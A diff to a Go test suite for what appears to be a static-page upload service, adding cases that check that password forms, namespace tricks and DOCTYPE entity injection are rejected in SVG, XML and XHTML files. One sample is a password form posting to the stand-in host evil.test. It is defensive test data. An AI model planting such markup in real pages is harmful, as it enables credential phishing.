@@ -725,7 +725,7 @@ func TestPatchNeverWhenMaximumIsUnlimited(t *testing.T) {
 }
 
 func TestRejectsActiveMarkupOutsideHTML(t *testing.T) {
-	s, err := New(Config{DataDir: t.TempDir(), PublicBaseURL: "https://pages.test", UploadToken: "test-token", UploadsPerMinute: 20})
+	s, err := New(Config{DataDir: t.TempDir(), PublicBaseURL: "https://pages.test", UploadToken: "test-token", UploadsPerMinute: 40})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -742,6 +742,22 @@ func TestRejectsActiveMarkupOutsideHTML(t *testing.T) {
 			"index.html":  `<h1>ok</h1>`,
 			"diagram.svg": `<svg xmlns="http://www.w3.org/2000/svg"><script src="https://example.com/x.js"></script></svg>`,
 		},
+		"xml form": {
+			"index.html": `<h1>ok</h1>`,
+			"note.xml":   `<html xmlns="http://www.w3.org/1999/xhtml"><form action="https://evil.test"><input type="password"/></form></html>`,
+		},
+		"prefixed form": {
+			"index.html":  `<h1>ok</h1>`,
+			"diagram.svg": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"><h:form><h:input type="password"/></h:form></svg>`,
+		},
+		"xml raw text": {
+			"index.html": `<h1>ok</h1>`,
+			"page.xhtml": `<html xmlns="http://www.w3.org/1999/xhtml"><plaintext><form><input type="password"/></form></plaintext></html>`,
+		},
+		"doctype entity": {
+			"index.html": `<h1>ok</h1>`,
+			"page.xhtml": `<!DOCTYPE html [<!ENTITY f "<input type='password'/>">]><html xmlns="http://www.w3.org/1999/xhtml">&f;</html>`,
+		},
 	}
 	for name, files := range cases {
 		t.Run(name, func(t *testing.T) {
@@ -756,13 +772,20 @@ func TestRejectsActiveMarkupOutsideHTML(t *testing.T) {
 
 	plain := zipBytes(t, map[string]string{
 		"index.html":  `<h1>ok</h1>`,
-		"diagram.svg": `<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>`,
+		"diagram.svg": `<svg xmlns="http://www.w3.org/2000/svg"><script type="text/ecmascript">/* local */</script></svg>`,
+		"note.xml":    `<html xmlns="http://www.w3.org/1999/xhtml"><script>bad()</script></html>`,
 	})
-	resp := rawUpload(t, web.URL, "site.zip", plain, "")
+	created := uploadTestFile(t, web.URL, "site.zip", plain, "")
+	resp, err := http.Get(web.URL + "/p/" + created.ID + "/note.xml")
+	if err != nil {
+		t.Fatal(err)
+	}
 	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusCreated {
-		body, _ := io.ReadAll(resp.Body)
-		t.Fatalf("plain svg status = %d body = %s", resp.StatusCode, body)
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("xml status = %d", resp.StatusCode)
+	}
+	if resp.Header.Get("Content-Security-Policy") == "" {
+		t.Fatal("xml response missing content security policy")
 	}
 }
 
